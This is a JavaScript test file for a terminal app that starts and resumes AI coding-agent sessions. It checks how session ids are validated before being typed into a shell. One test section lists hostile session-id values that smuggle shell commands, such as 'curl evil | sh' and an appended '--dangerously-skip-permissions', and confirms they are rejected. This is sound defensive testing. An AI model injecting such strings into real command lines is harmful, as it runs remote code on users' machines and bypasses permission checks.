/**
 * Starting an agent again after a restart.
 *
 * The one thing here that cannot be guessed from the flag names: `claude`
 * REFUSES `--session-id` for a session that already exists —
 * `Error: Session ID … is already in use.` (checked against the real CLI on
 * 2026-09-24). So the command that starts a conversation and the command that
 * resumes one are never the same command, and a resume built from the start
 * command would kill the terminal on every relaunch. That is what AG-02
 * exists for.
 */
import { describe, test, assert } from '../e2e/harness/testFramework.js';
import {
  AGENT_IDS,
  agentLabel,
  isKnownAgent,
  newSessionId,
  resumeCertainty,
  resumeCommand,
  serializeAgent,
  startCommand,
} from '../../src/lib/agents.js';
import { useTerminalStore as T } from '../../src/stores/terminalStore.js';
import { mockBridge } from '../../src/lib/ipc.js';

const UUID_V4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;

describe('Agent sessions: starting one, and starting it again', () => {
  test('AG-01: starting claude chooses the id, so the conversation can be named later', () => {
    const { command, agent } = startCommand('claude');
    assert.equal(agent.kind, 'claude');
    assert.equal(UUID_V4.test(agent.sessionId), true, `not a v4 uuid: ${agent.sessionId}`);
    assert.equal(command, `claude --session-id ${agent.sessionId}`);
    // `--session-id` is the only shape the CLI accepts for choosing one, and
    // it wants a v4 UUID specifically.
    assert.equal(UUID_V4.test(newSessionId()), true);
    assert.notEqual(newSessionId(), newSessionId());
  });

  test('AG-02: resuming never repeats the flag that CREATES a session', () => {
    const { agent } = startCommand('claude');
    const resume = resumeCommand(agent);

    assert.equal(resume, `claude --resume ${agent.sessionId}`);
    assert.equal(
      resume.includes('--session-id'),
      false,
      'the CLI refuses an id that exists — this would kill the terminal on every relaunch'
    );
  });

  test('AG-03: an agent that cannot name a session says so instead of pretending', () => {
    const { command, agent } = startCommand('opencode');
    assert.equal(command, 'opencode', 'nothing to pass: it has no way to choose an id');
    assert.equal(agent.sessionId, null);
    assert.equal(resumeCommand(agent), 'opencode --continue');

    // Which is a weaker promise, and the interface has to know that: two
    // opencode terminals on one folder would both land on the same
    // conversation, so nothing may claim it is "that" one.
    assert.equal(resumeCertainty(agent), 'latest');
    assert.equal(resumeCertainty(startCommand('claude').agent), 'exact');
  });

  test('AG-04: a claude record with no id falls back rather than breaking', () => {
    // How a tab looks when the agent was typed by hand rather than started by
    // NexTerm: we know what is running, not which conversation.
    const typed = { kind: 'claude', sessionId: null, startedAt: Date.now() };
    assert.equal(resumeCommand(typed), 'claude --continue');
    assert.equal(resumeCertainty(typed), 'latest');
  });

  test('AG-05: anything unrecognised resumes nothing at all', () => {
    // A workspace saved by a later build, or a corrupted one. Offering to run
    // an unknown name would be typing a stranger's command into a shell.
    for (const bad of [null, undefined, {}, { kind: 'rm' }, { kind: 'claude-code' }, { kind: 42 }]) {
      assert.equal(resumeCommand(bad), null, `resumed something for ${JSON.stringify(bad)}`);
      assert.equal(resumeCertainty(bad), null);
      assert.equal(serializeAgent(bad), null);
    }
    assert.equal(isKnownAgent('claude'), true);
    assert.equal(isKnownAgent('nope'), false);
  });

  test('AG-06: what gets persisted is narrow, and survives a round trip', () => {
    const { agent } = startCommand('claude');
    const stored = serializeAgent({ ...agent, extra: 'dropped', sessionId: agent.sessionId });

    assert.deepEqual(Object.keys(stored).sort(), ['kind', 'sessionId', 'startedAt']);
    assert.equal(resumeCommand(stored), `claude --resume ${agent.sessionId}`);
    // A field of the wrong type is not carried into a command line.
    assert.equal(serializeAgent({ kind: 'claude', sessionId: { evil: true } }).sessionId, null);
    assert.equal(serializeAgent({ kind: 'claude', startedAt: 'soon' }).startedAt, null);
  });

  test('AG-07: every agent this build offers can be started and resumed', () => {
    for (const id of AGENT_IDS) {
      const { command, agent } = startCommand(id);
      assert.ok(command.startsWith(id), `${id}: command does not run ${id}`);
      assert.ok(agentLabel(id).length > 0, `${id}: nothing to call it in the UI`);
      assert.ok(resumeCommand(agent), `${id}: cannot be resumed at all`);
    }
    assert.throws(() => startCommand('nope'));
  });
});

describe('What a saved workspace can put on a command line', () => {
  // The session id is typed into the user's shell, and it arrives from a JSON
  // file that anything can have written. `serializeAgent` used to keep any
  // string, so `x; curl evil | sh` resumed as `claude --resume x; curl evil |
  // sh` — while the comment on the payload said a foreign one could not put a
  // command on a shell.
  const ID = '0b9f4a1e-3c2d-4e5f-8a7b-6c5d4e3f2a1b';
  const HOSTILE = [
    'x; curl evil | sh',
    '$(curl evil | sh)',
    '`curl evil | sh`',
    'x | sh',
    'x && curl evil',
    'x\ncurl evil',
    `${ID}; curl evil | sh`,
    `${ID}\n`,
    ` ${ID}`,
    `${ID} --dangerously-skip-permissions`,
    '--dangerously-skip-permissions',
    '123e4567-e89b-12d3-a456-426614174000', // a UUID, but not a v4 one
  ];

  test('AG-08: an id this build could not have made is not kept, and resuming falls back to the latest', () => {
    for (const sessionId of HOSTILE) {
      const stored = serializeAgent({ kind: 'claude', sessionId, startedAt: 1 });
      assert.equal(stored.sessionId, null, `kept ${JSON.stringify(sessionId)}`);
      // AG-04's fallback, and said as such — not a broken command.
      assert.equal(resumeCommand(stored), 'claude --continue');
      assert.equal(resumeCertainty(stored), 'latest');
    }
  });

  test('AG-09: resumeCommand refuses one itself, even from a record that was never serialized', () => {
    // It is exported, so a record can reach it without `serializeAgent` in
    // front — and the banner must not promise "this conversation" for a
    // resume that cannot be exact.
    for (const sessionId of HOSTILE) {
      const raw = { kind: 'claude', sessionId, startedAt: 1 };
      const command = resumeCommand(raw);
      assert.equal(command, 'claude --continue', `would have typed ${JSON.stringify(command)}`);
      assert.equal(resumeCertainty(raw), 'latest');
    }
  });

  test('AG-10: an uppercase UUID is refused too, though most parsers would take it', () => {
    // A choice, not an oversight. This build only ever writes lowercase —
    // `crypto.randomUUID` does, and so does `newSessionId`'s fallback — so an
    // uppercase id did not come from here. And the conversation is a file
    // named after the id: whether the other case finds it depends on the CLI
    // and the filesystem, which an `exact` resume cannot promise.
    const upper = ID.toUpperCase();
    assert.equal(serializeAgent({ kind: 'claude', sessionId: upper }).sessionId, null);
    assert.equal(resumeCommand({ kind: 'claude', sessionId: upper }), 'claude --continue');
    assert.equal(resumeCommand({ kind: 'claude', sessionId: ID }), `claude --resume ${ID}`);
  });

  test('AG-11: every id this build makes still resumes exactly, by either route', () => {
    // The other half of AG-08: a check stricter than the ids it guards would
    // quietly turn every exact resume into "the most recent one".
    const roundTrips = () => {
      for (let i = 0; i < 100; i += 1) {
        const { agent } = startCommand('claude');
        const stored = serializeAgent(agent);
        assert.equal(stored.sessionId, agent.sessionId, `refused its own id ${agent.sessionId}`);
        assert.equal(resumeCertainty(stored), 'exact');
      }
    };
    roundTrips();

    // Without `crypto.randomUUID` — a page served over plain http —
    // `newSessionId` builds the id itself, and that one has to pass too.
    const own = Object.getOwnPropertyDescriptor(globalThis.crypto, 'randomUUID');
    Object.defineProperty(globalThis.crypto, 'randomUUID', { value: undefined, configurable: true });
    try {
      roundTrips();
    } finally {
      if (own) Object.defineProperty(globalThis.crypto, 'randomUUID', own);
      else delete globalThis.crypto.randomUUID;
    }
    assert.equal(typeof globalThis.crypto.randomUUID, 'function', 'teardown: randomUUID is back');
  });
});

describe('Resuming waits for the prompt', () => {
  // Resume works by typing. While a command is running the text goes to that
  // program instead of the shell — and the likeliest program is the agent
  // itself, started by hand while the offer was still showing.
  const tabById = (id) => T.getState().tabs.find((t) => t.id === id);

  /** Everything typed into a terminal while `fn` ran. */
  async function typedDuring(fn) {
    const original = mockBridge.invoke;
    const typed = [];
    mockBridge.invoke = function (command, args, ...rest) {
      if (command === 'pty_write') typed.push(args?.data);
      return original.call(this, command, args, ...rest);
    };
    try {
      await fn();
    } finally {
      mockBridge.invoke = original;
    }
    return typed;
  }

  test('AG-12: Resume types nothing while a command is running, and the offer stays', async () => {
    await T.getState().init();
    const tab = await T.getState().createTab();
    assert.ok(tab, 'setup: a terminal to resume in');
    try {
      const { agent } = startCommand('claude');
      T.setState((s) => ({
        tabs: s.tabs.map((t) => (t.id === tab.id ? { ...t, agent, agentResumeOffered: true } : t)),
      }));
      // OSC 133 "C": what the shell sends when a command starts.
      await mockBridge.emit('pty-command-started', { session_id: tab.sessionId });
      assert.equal(tabById(tab.id).running, true, 'setup: the terminal is busy');

      let resumed;
      const typed = await typedDuring(async () => {
        resumed = await T.getState().resumeAgent(tab.id);
      });
      assert.equal(resumed, false, 'claimed to resume into a busy terminal');
      assert.deepEqual(typed, [], 'typed into whatever was running');
      assert.equal(tabById(tab.id).agentResumeOffered, true, 'the offer went away unused');

      // Back at the prompt, the same offer works.
      await mockBridge.emit('pty-command-done', { session_id: tab.sessionId, exit_code: 0 });
      const typedAfter = await typedDuring(async () => {
        resumed = await T.getState().resumeAgent(tab.id);
      });
      assert.equal(resumed, true);
      assert.deepEqual(typedAfter, [`claude --resume ${agent.sessionId}\r`]);
      assert.equal(tabById(tab.id).agentResumeOffered, false);
    } finally {
      await T.getState().closeTab(tab.id);
    }
  });
});
